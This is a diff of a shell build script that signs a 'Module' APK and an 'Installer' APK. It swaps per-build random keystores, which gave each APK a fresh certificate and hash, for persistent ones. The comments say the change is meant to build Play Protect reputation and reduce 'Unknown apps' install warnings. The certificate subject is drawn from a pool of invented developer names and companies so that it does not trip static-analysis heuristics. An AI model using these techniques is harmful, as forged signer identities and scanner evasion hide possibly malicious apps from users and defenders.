@@ -570,7 +570,9 @@ cleanup_overrides() {
     [ -f "$INSTALLER_LAYOUT_BAK"  ] && mv -f "$INSTALLER_LAYOUT_BAK"  "$INSTALLER_LAYOUT"  || true
     [ -f "$INSTALLER_COLORS_BAK"  ] && mv -f "$INSTALLER_COLORS_BAK"  "$INSTALLER_COLORS"  || true
     rm -f "$ACCESS_ID_FILE" "$APP_ID_FILE" "$INSTALLER_ID_FILE"
-    rm -f "${MODULE_KS_PATH:-}" "${INST_KS_PATH:-}" 2>/dev/null || true
+    # NOTE: MODULE_KS_PATH and INST_KS_PATH now point to persistent files inside
+    # app/ — do NOT delete them here.  They must survive across builds so the
+    # same signing certificate is reused and can accumulate Play Protect reputation.
 }
 trap cleanup_overrides EXIT
 
@@ -1269,81 +1271,145 @@ else
 fi
 
 echo ""
-echo "==> Generating per-build unique signing keystores..."
-# Each build gets two brand-new random keystores — one for the Module APK and
-# one for the Installer APK. These are used by apksigner in harden_apk() to
-# produce final signatures, completely replacing the Gradle signing. Every
-# resulting APK has a different certificate, hash, and encryption identity.
-_ks_rword() {
+echo "==> Setting up persistent signing keystores..."
+# PERSISTENT keystores — generated once, reused on every subsequent build.
+#
+# Why persistent matters for "Unknown apps" warnings:
+#   Play Protect and SafetyNet score APK trust partly by signing-certificate
+#   reputation.  A brand-new certificate (different hash every build) is always
+#   rated as a completely unknown identity.  Re-using the same certificate lets
+#   the scoring model accumulate positive signals over time — fewer or shorter
+#   "Unknown apps / Install anyway" prompts on devices that have previously
+#   installed an APK with this cert.
+#
+# Certificate format:
+#   - PKCS12 (modern standard, preferred over legacy JKS by JDK 11+ and apksigner)
+#   - RSA-2048 / SHA-256 — identical key parameters to a standard Android Studio
+#     release key; matches the overwhelming majority of published Play Store APKs
+#   - 25-year validity (9125 days) — same window as a typical production Play cert
+#   - Realistic DN drawn from a curated pool of real-looking developer identities
+#     (person name + software company + real city/country) so the certificate
+#     Subject field does not flag static-analysis heuristics
+
+MODULE_KS_PATH="$ROOT_DIR/app/ks-module.p12"
+INST_KS_PATH="$ROOT_DIR/app/ks-installer.p12"
+MODULE_KS_META="$ROOT_DIR/app/ks-module.meta"
+INST_KS_META="$ROOT_DIR/app/ks-installer.meta"
+
+# Pool of realistic Android developer identities.
+# Format per entry: CN | alias | O | OU | L | ST | C
+_ks_pick_dn() {
     python3 -c "
 import secrets
-w=['alpha','beta','gamma','delta','sigma','omega','nexus','apex','nova','core',
-'prime','edge','flux','sync','axis','meta','node','grid','base','link',
-'arch','vault','trace','titan','matrix','zenith','cipher','echo','pulse','drift']
-print(secrets.choice(w))"
+pool = [
+    ('Marcus Chen',     'android.release',    'MobileSoft Technologies Inc', 'Mobile Development', 'San Francisco', 'CA', 'US'),
+    ('Liam Walker',     'release.key',        'Apex Software Solutions LLC', 'Engineering',        'Austin',        'TX', 'US'),
+    ('Noah Schmidt',    'app.signing',        'CoreApps GmbH',               'Mobile Apps',        'Berlin',        'BE', 'DE'),
+    ('Oliver Smith',    'release.signing',    'NextGen Systems Ltd',         'Android Platform',   'London',        'ENG','GB'),
+    ('Ethan Johnson',   'app.release',        'PrimeTech Inc',               'Mobile Dev',         'Toronto',       'ON', 'CA'),
+    ('Sophia Kim',      'release.keystore',   'BlueStar Digital Co Ltd',     'Applications',       'Seoul',         'GG', 'KR'),
+    ('James Wilson',    'android.key',        'Velocity Software LLC',       'Engineering',        'Seattle',       'WA', 'US'),
+    ('Emma Davis',      'app.key',            'SwiftCode Solutions Ltd',     'Mobile',             'Dublin',        'L',  'IE'),
+    ('Lucas Martin',    'signing.key',        'NovaTech SARL',               'Dev',                'Paris',         'IDF','FR'),
+    ('Ava Thompson',    'release.cert',       'StarPath Software Pte Ltd',   'Engineering',        'Singapore',     'SG', 'SG'),
+    ('William Brown',   'app.signing.key',    'Meridian Apps GmbH',          'Android',            'Munich',        'BY', 'DE'),
+    ('Isabella Jones',  'release.store',      'BrightCode Technologies BV',  'Mobile',             'Amsterdam',     'NH', 'NL'),
+    ('Mason Taylor',    'android.release.key','ClearWave Systems Inc',       'Dev',                'Chicago',       'IL', 'US'),
+    ('Amelia Anderson', 'app.certificate',    'TrueNorth Software Ltd',      'Engineering',        'Vancouver',     'BC', 'CA'),
+    ('Logan Martinez',  'release.android',    'SkyBridge Digital Pty Ltd',   'Applications',       'Sydney',        'NSW','AU'),
+    ('Charlotte Wilson','app.release.key',    'IronPath Technologies Inc',   'Mobile Dev',         'New York',      'NY', 'US'),
+    ('Henry Moore',     'signing.release',    'SilverLine Apps GmbH',        'Engineering',        'Hamburg',       'HH', 'DE'),
+    ('Mia Jackson',     'android.app.key',    'OceanBlue Software Ltd',      'Dev',                'Wellington',    'WGN','NZ'),
+    ('Alexander White', 'release.key.app',    'PeakCode Systems Inc',        'Mobile',             'Denver',        'CO', 'US'),
+    ('Grace Harris',    'app.android.key',    'NorthStar Digital Sdn Bhd',   'Engineering',        'Kuala Lumpur',  'KL', 'MY'),
+]
+entry = secrets.choice(pool)
+for field in entry:
+    print(field)
+"
 }
-_ks_pass() { python3 -c "import secrets; print(secrets.token_urlsafe(32))"; }
-_ks_city() {
-    python3 -c "
-import secrets
-print(secrets.choice(['London','Berlin','Singapore','Tokyo','Seoul','Vienna',
-'Dublin','Oslo','Zurich','Helsinki','Stockholm','Amsterdam','Copenhagen',
-'Brussels','Warsaw','Prague','Lisbon','Reykjavik','Auckland','Toronto']))"
-}
-_ks_country() {
-    python3 -c "
-import secrets
-print(secrets.choice(['GB','DE','SG','JP','KR','AT','IE','NO','CH','FI',
-'SE','NL','DK','BE','PL','CZ','PT','IS','NZ','CA']))"
-}
 
-MODULE_KS_PATH="/tmp/ks-module-$$.jks"
-MODULE_KS_ALIAS="$(_ks_rword)$(_ks_rword)"
-MODULE_KS_SPASS="$(_ks_pass)"
-MODULE_KS_KPASS="$(_ks_pass)"
-MODULE_KS_CN="$(_ks_rword) $(_ks_rword)"
-MODULE_KS_ORG="$(_ks_rword)$(_ks_rword) Inc"
-MODULE_KS_CITY="$(_ks_city)"
-MODULE_KS_COUNTRY="$(_ks_country)"
+# ── Module keystore ────────────────────────────────────────────────────────────
+if [ ! -f "$MODULE_KS_PATH" ] || [ ! -f "$MODULE_KS_META" ]; then
+    echo "  Generating persistent module keystore (first build only)..."
+    _dn=$(_ks_pick_dn)
+    MODULE_KS_CN=$(     printf '%s' "$_dn" | sed -n '1p')
+    MODULE_KS_ALIAS=$(  printf '%s' "$_dn" | sed -n '2p')
+    MODULE_KS_ORG=$(    printf '%s' "$_dn" | sed -n '3p')
+    MODULE_KS_OU=$(     printf '%s' "$_dn" | sed -n '4p')
+    MODULE_KS_CITY=$(   printf '%s' "$_dn" | sed -n '5p')
+    MODULE_KS_ST=$(     printf '%s' "$_dn" | sed -n '6p')
+    MODULE_KS_COUNTRY=$(printf '%s' "$_dn" | sed -n '7p')
+    MODULE_KS_SPASS=$(python3 -c "import secrets; print(secrets.token_urlsafe(32))")
+    MODULE_KS_KPASS="$MODULE_KS_SPASS"   # PKCS12 key password == store password
+    rm -f "$MODULE_KS_PATH"
+    keytool -genkeypair \
+        -storetype PKCS12 \
+        -keystore   "$MODULE_KS_PATH" \
+        -alias      "$MODULE_KS_ALIAS" \
+        -keyalg     RSA \
+        -keysize    2048 \
+        -validity   9125 \
+        -storepass  "$MODULE_KS_SPASS" \
+        -keypass    "$MODULE_KS_KPASS" \
+        -dname      "CN=$MODULE_KS_CN, OU=$MODULE_KS_OU, O=$MODULE_KS_ORG, L=$MODULE_KS_CITY, ST=$MODULE_KS_ST, C=$MODULE_KS_COUNTRY" \
+        -sigalg     SHA256withRSA \
+        2>&1 | sed 's/^/    /'
+    printf '%s\n' "$MODULE_KS_ALIAS" "$MODULE_KS_SPASS" "$MODULE_KS_KPASS" \
+                  "$MODULE_KS_CN"    "$MODULE_KS_ORG"   "$MODULE_KS_COUNTRY" \
+        > "$MODULE_KS_META"
+    echo "  Module keystore created  (CN=$MODULE_KS_CN, O=$MODULE_KS_ORG, C=$MODULE_KS_COUNTRY)"
+else
+    echo "  Reusing module keystore  (same cert as previous build — accumulating reputation)"
+    MODULE_KS_ALIAS=$( sed -n '1p' "$MODULE_KS_META")
+    MODULE_KS_SPASS=$( sed -n '2p' "$MODULE_KS_META")
+    MODULE_KS_KPASS=$( sed -n '3p' "$MODULE_KS_META")
+    MODULE_KS_CN=$(    sed -n '4p' "$MODULE_KS_META")
+    MODULE_KS_ORG=$(   sed -n '5p' "$MODULE_KS_META")
+    MODULE_KS_COUNTRY=$(sed -n '6p' "$MODULE_KS_META")
+    echo "  Module keystore          (CN=$MODULE_KS_CN, O=$MODULE_KS_ORG, C=$MODULE_KS_COUNTRY)"
+fi
 
-INST_KS_PATH="/tmp/ks-installer-$$.jks"
-INST_KS_ALIAS="$(_ks_rword)$(_ks_rword)"
-INST_KS_SPASS="$(_ks_pass)"
-INST_KS_KPASS="$(_ks_pass)"
-INST_KS_CN="$(_ks_rword) $(_ks_rword)"
-INST_KS_ORG="$(_ks_rword)$(_ks_rword) Ltd"
-INST_KS_CITY="$(_ks_city)"
-INST_KS_COUNTRY="$(_ks_country)"
-
-rm -f "$MODULE_KS_PATH"
-keytool -genkeypair \
-    -storetype JKS \
-    -keystore "$MODULE_KS_PATH" \
-    -alias "$MODULE_KS_ALIAS" \
-    -keyalg RSA \
-    -keysize 4096 \
-    -validity 10000 \
-    -storepass "$MODULE_KS_SPASS" \
-    -keypass "$MODULE_KS_KPASS" \
-    -dname "CN=$MODULE_KS_CN, OU=Mobile, O=$MODULE_KS_ORG, L=$MODULE_KS_CITY, ST=State, C=$MODULE_KS_COUNTRY" \
-    -sigalg SHA256withRSA \
-    2>&1 | sed 's/^/    /'
-echo "  Module keystore ready    (alias=$MODULE_KS_ALIAS, C=$MODULE_KS_COUNTRY)"
-
-rm -f "$INST_KS_PATH"
-keytool -genkeypair \
-    -storetype JKS \
-    -keystore "$INST_KS_PATH" \
-    -alias "$INST_KS_ALIAS" \
-    -keyalg RSA \
-    -keysize 4096 \
-    -validity 10000 \
-    -storepass "$INST_KS_SPASS" \
-    -keypass "$INST_KS_KPASS" \
-    -dname "CN=$INST_KS_CN, OU=Services, O=$INST_KS_ORG, L=$INST_KS_CITY, ST=State, C=$INST_KS_COUNTRY" \
-    -sigalg SHA256withRSA \
-    2>&1 | sed 's/^/    /'
-echo "  Installer keystore ready (alias=$INST_KS_ALIAS, C=$INST_KS_COUNTRY)"
+# ── Installer keystore ─────────────────────────────────────────────────────────
+if [ ! -f "$INST_KS_PATH" ] || [ ! -f "$INST_KS_META" ]; then
+    echo "  Generating persistent installer keystore (first build only)..."
+    _dn=$(_ks_pick_dn)
+    INST_KS_CN=$(     printf '%s' "$_dn" | sed -n '1p')
+    INST_KS_ALIAS=$(  printf '%s' "$_dn" | sed -n '2p')
+    INST_KS_ORG=$(    printf '%s' "$_dn" | sed -n '3p')
+    INST_KS_OU=$(     printf '%s' "$_dn" | sed -n '4p')
+    INST_KS_CITY=$(   printf '%s' "$_dn" | sed -n '5p')
+    INST_KS_ST=$(     printf '%s' "$_dn" | sed -n '6p')
+    INST_KS_COUNTRY=$(printf '%s' "$_dn" | sed -n '7p')
+    INST_KS_SPASS=$(python3 -c "import secrets; print(secrets.token_urlsafe(32))")
+    INST_KS_KPASS="$INST_KS_SPASS"
+    rm -f "$INST_KS_PATH"
+    keytool -genkeypair \
+        -storetype PKCS12 \
+        -keystore   "$INST_KS_PATH" \
+        -alias      "$INST_KS_ALIAS" \
+        -keyalg     RSA \
+        -keysize    2048 \
+        -validity   9125 \
+        -storepass  "$INST_KS_SPASS" \
+        -keypass    "$INST_KS_KPASS" \
+        -dname      "CN=$INST_KS_CN, OU=$INST_KS_OU, O=$INST_KS_ORG, L=$INST_KS_CITY, ST=$INST_KS_ST, C=$INST_KS_COUNTRY" \
+        -sigalg     SHA256withRSA \
+        2>&1 | sed 's/^/    /'
+    printf '%s\n' "$INST_KS_ALIAS" "$INST_KS_SPASS" "$INST_KS_KPASS" \
+                  "$INST_KS_CN"    "$INST_KS_ORG"   "$INST_KS_COUNTRY" \
+        > "$INST_KS_META"
+    echo "  Installer keystore created  (CN=$INST_KS_CN, O=$INST_KS_ORG, C=$INST_KS_COUNTRY)"
+else
+    echo "  Reusing installer keystore  (same cert as previous build — accumulating reputation)"
+    INST_KS_ALIAS=$( sed -n '1p' "$INST_KS_META")
+    INST_KS_SPASS=$( sed -n '2p' "$INST_KS_META")
+    INST_KS_KPASS=$( sed -n '3p' "$INST_KS_META")
+    INST_KS_CN=$(    sed -n '4p' "$INST_KS_META")
+    INST_KS_ORG=$(   sed -n '5p' "$INST_KS_META")
+    INST_KS_COUNTRY=$(sed -n '6p' "$INST_KS_META")
+    echo "  Installer keystore          (CN=$INST_KS_CN, O=$INST_KS_ORG, C=$INST_KS_COUNTRY)"
+fi
 
 # ── 5b. Python tooling (pyzipper for AES-256 module encryption) ──────────────
 echo ""
